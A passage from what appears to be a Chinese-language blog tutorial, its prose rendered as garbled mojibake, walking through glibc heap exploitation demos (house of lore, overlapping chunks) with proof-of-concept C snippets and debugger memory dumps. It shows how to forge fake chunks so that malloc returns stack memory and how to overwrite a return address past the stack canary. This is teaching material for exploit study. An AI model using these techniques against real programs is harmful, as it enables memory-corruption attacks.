chunkã€‚ç„¶ååœ¨æ ˆä¸Šä¼ªé€ ä¸¤ä¸ª chunkã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926152853.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926152853.png"></a></p><p>ä¼ªé€ çš„ä¸¤ä¸ª chunk ï¼Œ chunk 1 çš„ fd æŒ‡å‘ victim chunkï¼Œbk æŒ‡å‘ chunk2 ï¼Œchunk 2 çš„fd æŒ‡å‘ chunk 1ã€‚è¿™æ ·å°±æ„é€ äº†ä¸€ä¸ª small bin é“¾ã€‚</p><p>ç”±äºä¸Šæ–‡æåˆ°çš„  check </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">7</span> <span class="keyword">else</span></span><br><span class="line"> <span class="number">8</span>     &#123;</span><br><span class="line"> <span class="number">9</span>       bck = victim-&gt;bk;</span><br><span class="line"><span class="number">10</span>     <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span>                   errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line"><span class="number">13</span>                   <span class="keyword">goto</span> errout;</span><br><span class="line"><span class="number">14</span>                 &#125;</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">16</span>        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line"><span class="number">17</span>        bin-&gt;bk = bck;</span><br><span class="line"><span class="number">18</span>        bck-&gt;fd = bin;</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>        [ ... ]</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span> */</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ä¼ªé€ äº† ä¸¤ä¸ªchunk ä»¥åŠä»–ä»¬çš„ fd ï¼Œbkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>åœ¨ free æ‰ victim ä¹‹å‰ï¼Œæˆ‘ä»¬ malloc äº†ä¸€å— size ä¸º1000çš„chunkï¼Œåªæ˜¯ä¸ºäº†ç¡®ä¿åœ¨ free æ—¶ victim chunk ä¸ä¼šè¢«åˆå¹¶è¿› top chunk é‡Œã€‚</p><p>ç„¶åæˆ‘ä»¬é‡Šæ”¾æ‰ victimï¼Œ å¹¶ç”³è¯·ä¸€å—æ¯”è¾ƒå¤§çš„chunkï¼Œåªéœ€è¦å¤§åˆ°è®© malloc åœ¨ unsorted bin ä¸­æ‰¾ä¸åˆ°åˆé€‚çš„å°±å¯ä»¥äº†ï¼Œè¿™æ ·å°±ä¼šè®© victim è¢«æ•´ç†åˆ° smallbinsä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70: 0x7ffff7dd1bb8 (main_arena+184) â€”â–¸ 0x603000 â—‚â€” 0x7ffff7dd1bb8</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>æ¥ç€å°±æ˜¯æ¼æ´åˆ©ç”¨çš„ä¸€ä¸ªé‡ç‚¹ï¼Œæˆ‘ä»¬å‡è®¾æˆ‘ä»¬æœ‰æœºä¼šå»ä¿®æ”¹victim chunk çš„ bk æŒ‡é’ˆã€‚å¹¶è®©ä»–æŒ‡å‘æˆ‘ä»¬åœ¨æ ˆä¸Š fake çš„chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png"></a></p><p>è¿™ä¸ªæ—¶å€™ ï¼Œ victim chunkçš„bkæŒ‡å‘ stack_buffer_1,   fake chunk 1 çš„fd æŒ‡å‘äº† victim chunkã€‚æˆ‘ä»¬çŸ¥é“ small bins æ˜¯å…ˆè¿›åå‡ºçš„ï¼ŒèŠ‚ç‚¹çš„å¢åŠ å‘ç”Ÿåœ¨é“¾è¡¨å¤´éƒ¨ï¼Œè€Œåˆ é™¤å‘ç”Ÿåœ¨å°¾éƒ¨ã€‚è¿™æ—¶æ•´æ¡é“¾æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head  &lt;-fake chunk2 &lt;- facke chunk1 &lt;- victim chunk</span><br></pre></td></tr></table></figure><p>fake chunk 2 çš„ bk æŒ‡å‘äº†ä¸€ä¸ªæœªå®šä¹‰çš„åœ°å€ï¼Œå¦‚æœèƒ½é€šè¿‡å†…å­˜æ³„éœ²ç­‰æ‰‹æ®µï¼Œæ‹¿åˆ° HEAD çš„åœ°å€å¹¶å¡«è¿›å»ï¼Œæ•´æ¡é“¾å°±é—­åˆäº†ã€‚å½“ç„¶è¿™é‡Œå®Œå…¨æ²¡æœ‰å¿…è¦è¿™ä¹ˆåšã€‚</p><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬ malloc ä¸€å— chunkï¼Œå¦‚æœæˆ‘ä»¬malloc çš„å¤§å°æ­£å¥½æ˜¯ victim chunk çš„å¤§å°ï¼Œè¿™ä¸ªæ—¶å€™ç³»ç»Ÿä¼šå°† victim chunk å–å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png"></a></p><p>ç„¶åï¼Œæˆ‘ä»¬å† malloc ä¸€å—ã€‚è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±èƒ½æ¬ºéª—ç³»ç»Ÿï¼Œåœ¨stackæ ˆä¸Šè¿”å›ä¸€å—chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">101</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="number">102</span>   <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="number">103</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line">  <span class="number">104</span></span><br><span class="line">â–º <span class="number">105</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233627.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233627.png"></a></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥å®Œæˆæ”»å‡»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">108</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">â–º <span class="number">109</span>   <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="number">110</span>   <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br></pre></td></tr></table></figure><p>P4 + 40 çš„ä½ç½®åˆšå¥½æ˜¯ eipçš„çš„ä½ç½®ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233920.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233920.png"></a></p><p>æœ€åï¼Œæˆ‘ä»¬è¯´çš„æ˜¯small bin é“¾çš„æ„é€ ï¼Œå…¶å®æˆ‘è¿™é‡Œç”¨çš„æ˜¯ fastbin ï¼Œå…¶é‡Šæ”¾åè™½ç„¶æ˜¯è¢«åŠ å…¥åˆ° fast bins ä¸­ï¼Œè€Œsmall binæ˜¯é‡Šæ”¾å æ”¾å…¥ unsorted binï¼Œä½† malloc ä¹‹åï¼Œä¹Ÿä¼šè¢«æ•´ç†åˆ° small bins é‡Œã€‚</p><h3 id="0x09-overlapping-chunks"><a href="#0x09-overlapping-chunks" class="headerlink" title="0x09 overlapping_chunks"></a>0x09 overlapping_chunks</h3><p>ç®€å•çš„å †é‡å ï¼Œé€šè¿‡ä¿®æ”¹ sizeï¼Œåå¹¶é‚»å—ï¼Œç„¶åå†ä¸‹æ¬¡ mallocçš„æ—¶å€™ï¼ŒæŠŠé‚»å—ç»™ä¸€èµ·åˆ†é…å‡ºæ¥ã€‚è¿™ä¸ªæ—¶å€™å°±æœ‰äº†ä¸¤ä¸ªæŒ‡é’ˆå¯ä»¥æ“ä½œé‚»å—ã€‚ä¸€ä¸ªæ–°å—æŒ‡é’ˆï¼Œä¸€ä¸ªæ—§å—æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="number">23</span> p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="number">24</span> p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ†é…ï¼Œä¸‰ä¸ªchunkã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603200 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x81,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ free æ‰ chunk2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ chunk 2 è¢«åˆ†é…åˆ°äº† unsortedbin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x3131313131313131,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x3232323232323232,</span><br><span class="line">  bk_nextsize = 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) â€”â–¸ 0x603100 â—‚â€” 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œå‡è®¾æˆ‘ä»¬è¿™ä¸ªæ—¶å€™å¯ä»¥é€šè¿‡å †æº¢å‡ºä¿®æ”¹ chunk 2çš„size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">42</span> <span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="number">43</span> <span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="number">44</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line"><span class="number">45</span>  evil_chunk_size, evil_region_size);</span><br><span class="line"><span class="number">46</span></span><br><span class="line"><span class="number">47</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x101</span>,</span><br><span class="line">  fd = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  bk = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x3131313131313131</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603100</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  size = <span class="number">0x181</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  fd_nextsize = <span class="number">0x3232323232323232</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x3232323232323232</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603280</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x3333333333333333</span>,</span><br><span class="line">  size = <span class="number">0x20d81</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å‘ç° chunk 2çš„sizeè¢«ä¿®æ”¹åï¼Œåå¹¶äº† chunk3ï¼Œå¦‚æœæˆ‘ä»¬è¿™æ—¶å€™ malloc ä¸€å— 0x180 çš„chunkã€‚å³å°†ä¼šæŠŠ chunk2 å’Œchunk3 ä¸€èµ·åˆ†é…å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size); <span class="comment">//evil_region_size = 0x180-8</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å¯¹ p4 è¿›è¡Œå†™æ“ä½œçš„æ—¶å€™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">66</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="number">67</span> <span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="number">68</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="number">69</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿æŠŠ p3 ä¹Ÿå†™äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/40gx 0x603100</span><br><span class="line">0x603100:0x31313131313131310x0000000000000181</span><br><span class="line">0x603110:0x34343434343434340x3434343434343434</span><br><span class="line">0x603120:0x34343434343434340x3434343434343434</span><br><span class="line">0x603130:0x34343434343434340x3434343434343434</span><br><span class="line">0x603140:0x34343434343434340x3434343434343434</span><br><span class="line">0x603150:0x34343434343434340x3434343434343434</span><br><span class="line">0x603160:0x34343434343434340x3434343434343434</span><br><span class="line">0x603170:0x34343434343434340x3434343434343434</span><br><span class="line">0x603180:0x34343434343434340x3434343434343434</span><br><span class="line">0x603190:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031a0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031b0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031c0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031d0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031e0:0x34343434343434340x3434343434343434</span><br><span class="line">0x6031f0:0x34343434343434340x3434343434343434</span><br><span class="line">0x603200:0x34343434343434340x3434343434343434</span><br><span class="line">0x603210:0x34343434343434340x3434343434343434</span><br><span class="line">0x603220:0x34343434343434340x3434343434343434</span><br><span class="line">0x603230:0x34343434343434340x3434343434343434</span><br><span class="line"></span><br><span class="line">PwnLife&gt; p p3</span><br><span class="line"><span class="variable">$13</span> = (intptr_t *) 0x603210</span><br><span class="line">PwnLife&gt; x/20gx  p3</span><br><span class="line">0x603210:0x34343434343434340x3434343434343434</span><br><span class="line">0x603220:0x34343434343434340x3434343434343434</span><br><span class="line">0x603230:0x34343434343434340x3434343434343434</span><br><span class="line">0x603240:0x34343434343434340x3434343434343434</span><br><span class="line">0x603250:0x34343434343434340x3434343434343434</span><br><span class="line">0x603260:0x34343434343434340x3434343434343434</span><br><span class="line">0x603270:0x34343434343434340x3434343434343434</span><br><span class="line">0x603280:0x34343434343434340x0000000000020d81</span><br><span class="line">0x603290:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032a0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å»ä¿®æ”¹ p3 ï¼Œä¿®æ”¹ p4çš„å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">71</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="number">72</span> <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="number">73</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="number">74</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure><h3 id="0x10-overlapping-chunks-2"><a href="#0x10-overlapping-chunks-2" class="headerlink" title="0x10 overlapping_chunks_2"></a>0x10 overlapping_chunks_2</h3><p>åŒæ ·æ˜¯å †é‡å é—®é¢˜ï¼Œè¿™é‡Œæ˜¯åœ¨ free ä¹‹å‰ä¿®æ”¹ size å€¼ï¼Œä½¿ free é”™è¯¯åœ°ä¿®æ”¹äº†ä¸‹ä¸€ä¸ª chunk çš„ prev_size å€¼ï¼Œå¯¼è‡´ä¸­é—´çš„ chunk å¼ºè¡Œåˆå¹¶ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œ malloc äº”å—chunkï¼Œç¬¬äº”å—çš„ä½œç”¨æ˜¯é˜²æ­¢ chunk 4 è¢«free åè¢«æ”¾å…¥ top chunkã€‚ç„¶åè¿™é‡Œçš„è¦†ç›–ç›®æ ‡æ˜¯ chunk2 åˆ°chunk4ã€‚ </p><p>é¦–å…ˆ free æ‰ chunk 4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p4);</span><br></pre></td></tr></table></figure><p>ç”±äº chunk 4ç°åœ¨æ˜¯ free çŠ¶æ€ï¼Œè¿™ä¸ªæ—¶å€™ chunk 5 çš„presize å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PwnLife&gt; p p5</span><br><span class="line"><span class="variable">$3</span> = (intptr_t *) 0x603fd0</span><br><span class="line">PwnLife&gt; x/20gx p5-4</span><br><span class="line">0x603fb0:0x44444444444444440x4444444444444444                  &lt;--- chunk 5</span><br><span class="line">0x603fc0:0x00000000000003f00x00000000000003f0     &lt;---prev size   / size  </span><br><span class="line">0x603fd0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603fe0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603ff0:0x45454545454545450x4545454545454545</span><br><span class="line">0x604000:0x45454545454545450x4545454545454545</span><br><span class="line">0x604010:0x45454545454545450x4545454545454545</span><br><span class="line">0x604020:0x45454545454545450x4545454545454545</span><br><span class="line">0x604030:0x45454545454545450x4545454545454545</span><br><span class="line">0x604040:0x45454545454545450x4545454545454545</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬å‡è®¾ chunk 1 æœ‰å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å †æº¢å‡ºä¿®æ”¹ chunk 2çš„size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p2</span><br><span class="line">$<span class="number">4</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x603400</span></span><br><span class="line">PwnLife&gt; x/<span class="number">20</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x6033f0</span>:<span class="number">0x4141414141414141</span><span class="number">0x00000000000007e1</span>      &lt;--- size</span><br><span class="line"><span class="number">0x603400</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603410</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603420</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603430</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603440</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603450</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603460</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603470</span>:<span class="number">0x4242424242424242</span><span 